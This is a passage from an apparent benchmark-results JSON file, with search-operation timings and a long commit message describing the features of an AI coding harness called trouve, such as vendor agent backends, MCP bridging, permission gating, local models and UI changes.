            "name": "chunk_python_200_functions",
            "value": 2970796.794117647,
            "range": "± 1852",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1409997.3903508773,
            "range": "± 16386",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "43a1a7144d9c6fd55da4a6274f970522c74a4106",
          "message": "Add the trouve AI coding harness (#50)\n\n* Convert to a Cargo workspace and add the trouve coding harness\n\nMove trouve-search from the repo root into crates/trouve-search and add\nthe harness crates around it: trouve-protocol (versioned OpenAPI/SSE\nprotocol), trouve-core (engine, event-sourced store, git worktrees,\nmodes, permission gating, native tools), trouve-providers (OpenAI-compat\nand Anthropic providers, auth, secrets, model catalog), trouve-agents\n(Codex app-server, Cursor CLI, and Claude Code CLI backends with an MCP\nbridge for tools and permission prompts), trouve-server (HTTP/SSE API),\ntrouve-cli (auth, serve, mcp-bridge), trouve-client-core, the Slint\ndesktop app, and the slint-* widget crates.\n\ntrouve-search is embedded in-process as native search/find_related\ntools sharing one index cache; sessions warm the index on creation and\nsweep the shared store on archive/delete. Workflows, version-sync\nscripts, and npm manifests are adjusted for the workspace layout.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Expose native search to vendor agents and steer them to it\n\nClaude Code never saw trouve's semantic search: the MCP bridge only\nserved tools with full tool bridging enabled, and vendor agents prefer\ntheir built-in find/grep even when a better tool is listed. The bridge\nnow always serves the read-only search/find_related pair (executed\nin-process by the engine's ToolExecutor; the bridge is just transport),\nthe Claude adapter pre-allows them in approvals-only mode, and bridged\nturns append explicit system-prompt guidance — exact mcp__trouve__*\ntool names plus a prohibition on Bash find/grep discovery — adapted\nfrom trouve-search's agent plugin docs.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Render chat markdown with inline styling and command-aware tool titles\n\nAssistant text rendered raw markdown markers (**bold**, `code`) because\nthe block renderer intentionally skips inline styling. Non-code blocks\nnow go through Slint 1.17's StyledText (headings keep their size scale,\nbullets their glyph, code fences stay plain monospace), with markdown\nlinks opening in the system browser, restricted to http(s). Shell-style\ntool cards title themselves with the command they ran — \"Bash (wc -l\nfoo.rs)\" — instead of a bare tool name.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* List backend models dynamically from the vendor CLIs\n\nThe model picker showed a stale hardcoded snapshot: retired models\n(composer-1), models from backends that aren't logged in (codex), and\nnone of the newer catalog (Fable, Opus 4.8, thinking/MAX/fast\nvariants). AgentBackend now has an async list_models that asks the\nvendor — `cursor-agent models` parsed from its listing output, Codex\nvia model/list on the app-server with reasoning efforts expanded into\n`model@effort` variants that turn/start passes through — cached for\nfive minutes, falling back to a minimal static list offline. The\nengine skips backends that aren't installed and authenticated, since\ntheir models can't run anyway. Claude Code has no listing command and\nkeeps its sonnet/opus/haiku aliases, which the vendor maps to the\nnewest models on the plan.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Host the new-thread form in a provisional tab\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Stream thinking blocks and clean up turn status rendering\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Trust the session worktree on headless cursor-agent runs\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Drop remote git-URL cloning from trouve-search\n\nManaging clones of other people's repositories — credentials, freshness,\neviction, concurrent access — is out of scope for a search tool. The CLI,\nMCP server, native tool, and library now reject git URLs; clone the repo\nyourself and pass the local path.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add schema-driven model options and richer markdown rendering\n\nModels now declare their knobs (thinking level, fast mode, max-mode\nsurcharge) in an options schema so the composer can render them\ngenerically, with per-thread selections stored on the thread and passed\nthrough to backends; the Anthropic catalog is fetched live and shared\nbetween the API provider and the Claude CLI. Chat markdown gains ordered\nlists, nesting, correct fence handling, and set-off code styling.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Make chat text selectable with copy buttons and a raw-text view\n\nSlint's StyledText can't be selected, so plain-text surfaces (user\nmessages, code fences, tool detail, thinking) become read-only text\ninputs, copy buttons cover code blocks, messages, tool cards, whole\nresponses, diffs, and files, and each completed turn gains a\n\"select text\" toggle that swaps styled markdown for one fully\nselectable plain-text block.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Give prompt inputs multiline editing with Enter-to-send\n\nThe composer and new-chat message fields become a shared PromptBox:\na growing multi-line input (Shift+Enter for newlines, scrolls past\n~8 lines) with the composer's pickers and knobs moved to their own\nrow below the input.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Keep scroll position on chat toggles and make Styled a real toggle\n\nScroll-to-end is now opt-in per render, so expanding tool details or\nswitching a turn's view no longer jumps the list; the raw-view link\nbecomes a \"Styled\" toggle pill, on by default.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Nest turn output in collapsible cards with live thinking and highlighting\n\nChat items now fold into per-source cards: prompts, agent responses\n(absorbing their tool calls and thinking blocks in stream order, with\ngrouped tool runs), and a synthesized Agent wrapper while a turn opens\nwith tools/thinking before any text. Claude Code streams text and\nthinking live (--include-partial-messages, --thinking-display\nsummarized), bridged approvals attach to the vendor's existing tool\ncard instead of duplicating it, chat model updates diff in place so\ntoggles no longer jump the scroll position, code fences get syntect\nhighlighting, prompts and thinking render markdown, and the prompt\ninput grows a scrollbar once it stops expanding.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Title Read tool cards with a clickable filename and collapsible details\n\nRead-style tools (Read / read / read_file) now header as \"Read <basename>\",\nand clicking the filename opens the file in the Files tab via a new\nchat-file-opened callback that resolves worktree-relative paths. Tool\ncards drop the \"details\" link in favor of a disclosure arrow with the\nwhole header clickable, matching the other collapsible cards.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Fix session delete FK failure and hide archived sessions behind a filter\n\nDeleting a session whose thread had run a turn hit a FOREIGN KEY\nconstraint because backend_sessions rows were never cleared; the delete\ncascade now covers them and runs in one transaction (with foreign_keys\nenabled in the in-memory store so tests catch this). The left nav gains\na funnel button beside \"+\" with an Archived filter, hidden by default.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Collapse earlier turns' thinking blocks once the next prompt is sent\n\nThinking pills stay expanded while their turn is the latest, then\ndefault to collapsed when a newer turn exists — the reader has moved\non. The manual toggle flips whichever default applies.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add a rendered-markdown preview toggle to the file viewer\n\nMarkdown files get an eye button in the file header that swaps the\nhighlighted source for rendered blocks, reusing the chat's markdown\nrow pipeline so both surfaces render identically.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Give model pickers a fuzzy-search box\n\nBoth model selectors (composer drop-up and new-chat dropdown) become a\nSearchPicker with a focused search field; fuzzy filtering runs in Rust\nvia fuzzy-matcher (skim scoring, best match first) and Enter picks the\ntop hit.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Humanize tool call details instead of dumping raw JSON\n\nArgs and results render as indented key: value text with multiline\nstrings as blocks, nulls/empties dropped, and a result divider;\nClaude/MCP text-block results unwrap to their plain text.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Persist and restore window geometry across launches\n\nPosition, size, and maximized state save to the config dir as they\nchange (polled; Slint lacks move/resize callbacks) and restore on\nlaunch, falling back to defaults when the file is absent or implausible.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Reopen the last session, thread, and scroll position on launch\n\nThe shell polls a resume bookmark (session/thread ids from the\ncontroller plus the live chat scroll offset) into resume.json and the\ncontroller restores it at bootstrap, falling back to the most recent\nactive session when the saved ids no longer exist.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Confirm before quitting while agent turns are running\n\nWindow close with active turns opens a modal offering Quit, Quit when\nagents finish (defers until the running count the controller tracks\nhits zero), or Cancel, instead of silently tearing down mid-run.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Unblock read-only search and humanize tool and mode labels\n\nRead-only turns drop Claude's plan mode (its interactive plan-workflow\nprompt misfires headless and blocked the bridged code search); mutations\nare denied through the trouve approval gate instead, with definite\nmutators disallowed outright. Bridged trouve tools now report their real\nmutability so read-only search passes. ENABLE_TOOL_SEARCH is off since\nthe bridge exposes few tools, removing the ToolSearch round-trip. Tool\ncards show human names (Code Search/Tool Search/Web Search + query) and\nmode pickers/tabs show capitalized display names.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Bookmark the last open thread and scroll per session\n\nresume.json now stores the last open session plus per-session last\nthread and per-thread scroll maps, owned by the controller instead of\npolled UI properties. Clicking a session reopens its last thread, and\nopening a thread restores its saved scroll offset. The shell's poll\njust forwards scroll changes; deleted sessions drop their bookmarks.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Remove the Max Mode concept\n\nCursor retired Max Mode, so the ModelInfo flag, the composer's\n\"Max · +20%\" badge, and all the plumbing between them go away. The\n\"1M\" display-name check stays only to infer the context window.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Manage vendor CLI installs and move Cursor to ACP\n\nSettings gains a Vendor CLIs section that downloads official cursor-agent,\nClaude Code, and Codex builds into trouve's data dir (managed installs beat\nPATH). The Cursor backend now speaks the Agent Client Protocol: real model\nmetadata with per-model thinking/context/effort/fast knobs, interactive\napprovals bridged through trouve's permission layer, and plan mode for\nread-only turns.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Group agent activity and enrich tool cards\n\nConsecutive tool calls and thinking blocks fold under one summarized\nheader (\"Edited 2 files, read 3 files, thought 1 time\") while narration\nalways stays at the card's top level. Thinking pills match tool-card\nstyling and flip to \"Thought\" when done. Edit tools show a clickable\nfilename, +/− line counts, and an inline red/green diff; reads show the\nline range and preselect it in the file view on click. Agent headers name\nthe model that ran the turn.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Pin the chat to its tail while streaming\n\nScroll-to-end ran before the ListView re-measured freshly grown rows, so\nthe activity spinner could sit below the fold until the next event. A\nfollow flag now re-clamps the viewport on every content-height change;\nin-place re-renders and restored scroll bookmarks clear it.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Let the right panel grow at the chat's expense\n\nThe Diff/Files splitter was hard-capped at 800px; its max now tracks the\nwindow, leaving only a 340px chat floor. Window or left-column resizes\nre-clamp the panel imperatively (a width binding would loop the layout).\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Answer cursor/create_plan so plan mode stops hanging\n\ncursor-agent submits the finished plan as a session-less JSON-RPC\nrequest and blocks the turn on the response; the adapter never\nanswered it, so plan-mode turns spun forever. Ack it in the reader,\nstash the plan content, and attach it as the plan tool call's result.\nUnroutable server requests now get a method-not-supported error\ninstead of silence, and \"other\" tool calls surface their real name\nfrom rawInput._toolName. Also retry ETXTBSY stub spawns in the\nadapter tests to fix a pre-existing parallel-test flake.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add an interactive question wizard for agent questions\n\nAgents can now defer to the user mid-turn with structured questions\n(single/multi choice, an Other free-form, wizard paging with back/review\nbefore submit). The engine serves an ungated ask_question tool to native\nprovider turns, the MCP bridge carries it to Claude, and the cursor\nadapter answers cursor/ask_question ACP requests — though Cursor's\nbackend does not yet deal that tool to models on the ACP surface, so the\nhandler waits for their rollout. Additive protocol bump to 0.5:\nquestion.requested/question.resolved events and POST /v1/questions.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Show file line numbers in edit tool diffs\n\nSnippet edits carry no position, so the engine resolves each old_string\nagainst the pre-edit worktree file when the call is announced and stores\na \"_line\" hint in the event args; patch payloads take their numbers from\nhunk headers and writes count from 1. The chat's diff rows gain old/new\ngutter columns, hidden when no position resolved.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Keep the tab strip visible on the new-thread form\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Turn the Files tab into an expandable tree view\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Keep the chat tail pinned when toggling cards at the bottom\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Persist the side panel splitter widths across restarts\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add /skill slash-command completion to the composer\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Move settings from a separate window into an in-window screen\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add keyboard scrolling, unstick the chat tail pin, full-window settings\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Open files in the system editor and dock the file tree in a drawer\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Run cargo fmt\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Keep the chat pinned to the tail when a prompt is submitted\n\nSubmitting a prompt scrolls to the bottom, but the tail pin kept dying\nmid-jump: the ListView re-derives viewport-y while re-measuring freshly\ninstantiated rows, and the viewport-y watcher mistook those adjustments\nfor user scrolls and ended following, leaving the new prompt below the\nfold. Only treat a move with the content height unchanged as a user\nscroll; layout-driven moves re-pin so the jump converges. Scrollbar\ndrags end following explicitly.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Stop test engines from clobbering the user's config.toml\n\nEngine::new defaulted its write-back path to the real config file, so\nany engine built from a synthetic config — the server e2e tests upsert\nproviders on Config::default() — persisted that config over the user's\nconfig.toml, wiping their provider list on every test run. Config\nwrite-back is now opt-in: only the server binary and `trouve serve`,\nwhich load the real file, point the engine back at it.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Make vendor CLI logins open the right page, once, and retryably\n\nNeutralize $BROWSER for spawned login CLIs so the client opens the\nscraped URL through the desktop default browser; skip loopback URLs\n(codex's local redirect listener) when scraping, keeping the sender\nalive until a real URL appears; and re-present a pending login's URL\ninstead of refusing, so closing the browser tab isn't a dead end.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Refresh the model picker after a login completes\n\nLogging in can unlock backend models, but the login-success path only\nrefreshed the settings screen, so new models stayed hidden until the\napp restarted.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Catch the codex adapter up to the current app-server protocol\n\ncodex-cli 0.144 renamed several wire values and reshaped token usage:\napproval policy \"unlessTrusted\" is now \"untrusted\", thread/start's\nsandbox enum went kebab-case (turn/start's sandboxPolicy tag stays\ncamelCase), approval decisions are \"approved\"/\"denied\" instead of\n\"accept\"/\"decline\", and per-call usage moved under tokenUsage.last —\nwhich had zeroed out token stats and the context dial.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Keep one claude process per thread alive across turns\n\nEvery Claude Code turn paid the CLI's cold start, a transcript re-read,\nand an MCP bridge re-handshake because we ran claude -p once per prompt.\nTurns now feed a persistent per-thread process over stream-json stdin,\nwith the pool bounded by an LRU cap (3) and a 5-minute idle reaper —\nkilling a pooled process is always safe since the transcript is on disk\nand --resume restores it. A turn whose spawn-time config (model,\noptions, instructions, permission, bridge) or session id changed\nrespawns; cancellation kills the process outright, as before.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add Kilo Code preset with live gateway model discovery\n\nopenai-compat providers now fetch the gateway's /models listing\n(OpenRouter-style metadata: display names, context windows, per-token\npricing, tool capability) instead of listing nothing off api.openai.com,\nwhich the new kilocode preset needs to be usable. Compaction now\nconsults the live listing too and falls back to a conservative 100k\nwindow for unknown models — never compacting let gateway threads grow\nuntil requests failed.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add accessible theme support with font and motion preferences\n\nEvery UI color now resolves through a semantic Theme global; Rust owns\nfive built-in palettes (dark, light, high-contrast dark, colorblind\ndark/light) verified as units by a WCAG AA contrast test, which is also\nwhy individual colors can't be user-overridden. A new Appearance\nsettings section picks the theme, base font size (everything scales\nthrough Theme.fs()), UI font, and Reduce Motion (spinners become static\nglyphs); choices persist to appearance.json. Theme switches restyle the\nstd widgets, re-bake syntax-highlight and inline-code colors, and\nre-highlight the open file.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Report real codex context windows from live token usage\n\ncodex's model/list never includes context windows, so every model showed\na hardcoded 272k. The app-server does report the true window via\nthread/tokenUsage/updated (modelContextWindow), so carry it on Usage,\npersist it through turn.completed, overlay observed values onto the\nmodel catalog, and prefer it in the app's context dial.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Slim the sidebar footer to a settings gear icon\n\nReplace the labeled settings button with an icon button and drop the\nstatus line: its notices duplicated visible UI state, and the two real\nerror messages now go to the error banner instead.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Auto-refresh the diff panel and drop the manual button\n\nPoll session_diff every 2s and repaint only when the diff actually\nchanged, carrying collapsed files over by path. Picks up agent edits\nmid-turn and external edits without touching scroll state.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add a per-file copy button to diff file headers\n\nEach header row gets a right-aligned copy icon that copies just that\nfile's raw diff segment, split from the full diff in alignment with the\nparser's file order.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add a Pull Requests tab backed by a GitHub integration setting\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add MCP server management to settings with health checks and logs\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Show subscription health in providers settings\n\nCodex answers live via account/rateLimits/read on its app-server (plan,\n5h/weekly usage windows, credits); Cursor and Claude entries carry a note\nthat those vendors do not share subscription data with third parties.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Separate the thread tab strip from the chat with a header bar\n\nThe tabs sat directly on the chat's background and blended into\nscrolling content; give them an elevated strip (panel background,\nbottom hairline, soft shadow) so the chat reads as a layer beneath.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Pulse-dots activity indicator nested in the streaming Agent card\n\nReplace the stock spinner with three staggered accent dots (rise,\nswell, halo) and move the Processing/Thinking row inside the open\nAgent card's body so it reads as part of the response being populated.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Mount the trouve MCP bridge on Codex threads\n\nCodex ran with no MCP servers, so it always shelled out to rg instead\nof trouve's semantic search. Pass the bridge via thread/start-resume\nconfig.mcp_servers (search/find_related/ask_question; no approval gate\nsince Codex approvals are native RPCs) and make the search-preference\nguidance vendor-neutral so Codex receives it too.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Unify Modes and Models settings with mode CRUD and per-mode default models\n\nModes gain an optional default_model applied when a thread is created\nwithout an explicit model (request > mode default > global default).\nNew /v1/mode-infos and PUT/DELETE /v1/modes/{id} endpoints expose mode\nprovenance (builtin/customized/custom/workspace) and file-backed CRUD;\nthe settings screen replaces the two read-only sections with one that\nedits, adds, resets, and removes modes, with per-mode model pickers\nthat disable behind a \"Configure providers\" prompt when no models\nexist.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add local (offline) model support via a managed llama.cpp runtime\n\nA built-in \"local\" provider that works with zero configuration: trouve\ninstalls llama-server through the managed-CLI machinery (Vulkan build on\nLinux when the loader is present, Metal on macOS), downloads curated\nsingle-file GGUFs from HuggingFace with progress, labels each model by\nhardware fit (RAM/VRAM probe, Ollama-style heuristic), and lazily runs a\nhealth-checked llama-server sidecar behind the OpenAI-compat client.\nSettings gains a Local Models section; custom GGUF repos are the\npower-user escape hatch.\n\nAlso included: user MCP servers pass through to the Claude, Codex, and\nCursor backends; branch configs can disable inherited servers; the MCP\nsettings list is workspace-aware with an app-wide layer; and a right-panel\nMCP tab shows the session's effective merged config with provenance.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Persistent per-thread prompt queues with edit, reorder, and delete\n\nSending while a turn runs now enqueues the prompt in a new SQLite\nqueued_prompts table instead of racing the session lock; a per-thread\ndispatcher drains the queue in order between turns, including on\nsessions that aren't currently open. Queue changes ride the event\nstream (thread.queue_updated), so clients replay to the live state.\n\nA panel above the composer lists queued prompts with inline editing,\ndrag-and-drop reordering (plus single-step arrows), and deletion.\nQueues never auto-run at startup — a crash may have cut the in-flight\nturn short — and a failed turn pauses its queue; the \"Send now\" pill\nresumes either case explicitly.\n\nProtocol 0.7: TurnAccepted.queued, /v1/threads/{id}/queue endpoints\n(list/reorder/dispatch) and /v1/queue/{id} (edit/delete).\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* App icon, desktop entry, and Trouve window/process naming\n\nBrand the desktop app: branching-threads icon (window + hicolor theme),\na trouve.desktop entry with install script (Wayland compositors resolve\ntaskbar/titlebar icons through a desktop file matching the xdg app id,\nwhich Slint now sets explicitly), window title \"Trouve\", and the app\nbinary renamed trouve-app -> trouve.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Embed the MCP bridge in the server and remove trouve-cli\n\nThe stdio mcp-bridge subprocess is replaced by a streamable-HTTP MCP\nendpoint served directly by trouve-server (per-thread, tool/approval\nsurface via query params); Claude and Codex now connect over HTTP\ninstead of spawning a bridge binary. With the bridge gone, the unused\ntrouve-cli frontend is deleted along with the bridge_command provider\nconfig. Codex's rmcp client gates MCP tool calls behind\nmcpServer/elicitation/request; auto-accept for the trouve server (its\ntools are gated inside trouve) and route other servers' elicitations\nthrough the normal approval flow.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add an integrated terminal tab backed by a server-side PTY\n\nOne shell per session, spawned in its worktree via portable-pty and\nstreamed as base64 chunks over SSE (a side channel like files/diffs,\nnot the event log). slint-terminal gains an interactive TerminalGrid\nwidget with vt100 emulation, key/paste encoding, and scrollback; the\napp attaches lazily on first visit to the tab. Protocol 0.8.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Install lifecycle: progress, cancel, uninstall, and a local-models toggle\n\nDownloads (vendor CLIs, llama.cpp, GGUFs) now stream with byte progress\nshown as progress bars, and can be cancelled mid-transfer. Managed CLI\ninstalls and the llama.cpp runtime can be uninstalled; the runtime's\nUpdate button only shows when a newer build actually exists. Local\nmodels get a Switch that stops the sidecar and unregisters the \"local\"\nprovider (persisted in config.toml), plus a Restart button for the\nrunning llama-server. Protocol 0.9.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Desktop notifications for turns finishing, failing, or needing attention\n\nClient-side only: the controller already follows every opened thread's\nevent stream, so it pops a notify-rust toast when a turn completes,\nfails, or blocks on an approval/question — but only when the window is\nunfocused (sampled off the winit window by the geometry poll) or the\nthread isn't the one on screen. A freshness guard keeps history replay\nsilent, and on Linux clicking the toast raises the window and reopens\nthe session/thread. Preferences (master switch, per-event toggles,\nsound) live in a new settings section and persist to notifications.json.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Prompt attachments: images and files ride with messages (protocol 0.10)\n\nUploads are base64 in SendMessageRequest, stored server-side, and served\nat GET /v1/attachments/{id}. Images reach vendor agents natively (Claude\nbase64 blocks, Codex localImage, Cursor ACP image blocks); other files —\nand everything on text-only native providers — become path references\nthe agent reads with its tools. The composer gains an attach button,\nCtrl+V screenshot paste, and removable chips; queued prompts keep their\nattachments across restarts.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Local models: HuggingFace search replaces the manual GGUF form (protocol 0.11)\n\nAdding a local model is now search-and-pick: GET /v1/local/search queries\nHF's GGUF repos, lists each repo's single-file quants with the same\nhardware-fit guidance as the catalog, and recommends the best quant for\nthis machine (never sub-3-bit). The settings model list is split into\n\"Your models\" and \"Recommended\" sections.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Automations: scheduled prompts that spin up sessions (protocol 0.12)\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* GitHub OAuth sign-in and download-speed readouts (protocol 0.13)\n\nIntegrations gains \"Sign in with GitHub\" via the OAuth device flow when a\ngithub_client_id is configured; tokens now resolve env > oauth > saved PAT\n> gh CLI, with the source labelled in settings.\n\nAll download progress lines (vendor CLIs, llama.cpp, local models) now show\na smoothed transfer rate, estimated client-side from consecutive polls.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Session activity indicator in the sidebar (protocol 0.14)\n\nSessions processing a prompt — visible, background-queued, or spawned by\nan automation — show a pulsing dot in the session list. The engine emits\nsession.activity server events as sessions wake/idle, and Session.active\ncarries initial state on fetch.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Automation templates for common development chores (protocol 0.15)\n\nGET /v1/automations/templates serves a static catalog — dependency\nupdates, security audit, lint sweep, coverage gaps, docs drift, TODO\ntriage, daily digest — and the Automations screen grows a \"Start from a\ntemplate\" section that pre-fills the create form.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Self-hosted GitHub Enterprise support (protocol 0.16)\n\nThe GitHub integration is now host-based: github.com is always present,\nand enterprise instances can be registered from Settings → Integrations\n(or [[github_enterprise]] in config.toml), each with its own auth —\nenv var, OAuth device flow against the instance, pasted PAT, or the gh\nCLI keyring. Sessions route PR calls to the host their origin remote\nlives on, using the /api/v3 base for enterprise hosts.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Hand off history when swapping models mid-thread\n\nVendor sessions are now keyed by (thread, backend), so switching cursor →\nclaude → cursor resumes cursor's own session instead of starting blind\n(existing databases rebuild the table on open). Each row tracks how much\nof the transcript the backend has seen; the unseen part — everything for\na vendor joining mid-conversation, just the interleaved turns for one\nbeing resumed — is rendered into a capped digest prepended to its prompt.\nNative providers already rebuild from the stored transcript.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Migrate the workspace to Rust edition 2024\n\nThe only real behavior change was env::set_var/remove_var becoming\nunsafe — all six call sites are in tests and get safety comments. The\nrest is upside: clippy collapsed the nested if-lets the new edition's\nlet chains make redundant, plus the fmt fallout.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Scope the archived-sessions filter to its workspace\n\nThe funnel toggle flipped one global flag, so showing archived sessions\nin one workspace showed them everywhere. The controller now keeps a set\nof workspace ids, the toggle callback carries the header row it came\nfrom, and each header row feeds its own checkmark state to the popup.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Fit filters for the HuggingFace model search\n\nA \"Show:\" row of checkboxes under the search box filters results by how\ntheir GGUFs fit this machine — fits GPU / runs on CPU (both on by\ndefault) / too large (off, so unrunnable models now start hidden).\nFiltering is client-side over the fetched results, so toggling is\ninstant, and a status line notes when the filters hide everything.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Show the prompt immediately; keep the pulse out of the previous turn\n\nThe user message event now precedes the compaction check (whose model\nprobe can spawn llama-server and load a model), and the Processing pulse\nonly nests in an Agent card belonging to the running turn.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Show turn duration in the Agent card header\n\nComputed client-side from the persisted turn.started/completed envelope\ntimestamps, so durations survive restarts and history replays.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Move the session activity dot left of the session name\n\nA fixed-width slot in the row indent keeps titles aligned whether the\nsession is busy or not; the old placement hid the dot against the\nactions button.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add edit_file: surgical string-replace edits for native providers\n\nold_string must match exactly once (or set replace_all); native tool\nevents now carry the _line display hint so the UI diff numbers its\ngutter, which the renderer already understood for vendor edits.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add glob: recursive filename search for native providers\n\nBare patterns (\"*.rs\") match at any depth; results honour .gitignore\nand sort newest-first. Read-only modes allow it alongside grep.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add web_fetch: fetch a URL as readable text\n\nHTML converts via html2text; byte and return-size caps with offset\npaging keep huge pages from flooding the transcript.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add todo_write: the agent's task list as a chat checklist card\n\nState is per-worktree with merge-by-id updates; the tool result carries\nthe full list so the transcript always shows the current plan, and the\nUI renders it as a \"Todos (done/total)\" card with a checklist detail.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add background shell jobs: run_in_background, shell_output, shell_kill\n\nLong-running commands (dev servers, builds) no longer block the turn:\nshell returns a job id, output reads are incremental with optional\nwaiting, and jobs are capped in count, size, and lifetime and scoped\nto their worktree.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Add apply_patch: the V4A patch envelope Codex models are trained on\n\nAdd/Update (with @@ anchors and Move to)/Delete sections in one call;\nthe whole patch validates before any file is written. The chat diff\nrenderer already understood this format.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* read_file returns images as vision content for multimodal models\n\nImage files come back as \"_images\"; the engine strips the base64 from\nthe event log (leaving a size summary) and attaches it to the provider\ntool-result message — native image blocks for Anthropic, data-URL\nimage parts for chat-completions and Responses transcripts.\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Composer @ file mentions: fuzzy path completion from the session worktree\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Bake in the shared GitHub OAuth app: one-click sign-in with zero config\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Thinking controls for local models: GPT-OSS effort levels, Qwen3 on/off toggle\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* Reap leaked llama-servers via pidfile; let llama.cpp auto-fit VRAM\n\nCo-authored-by: Cursor <cursoragent@cursor.com>\n\n* spawn_thread / spawn_session / spawn_output: agents can delegate to child agents\n\nEngine-served tools (bridged to vendor agents too): spawn_thread starts a\nchild on a new thread in the same session, spawn_session in a fresh\nworktree branched 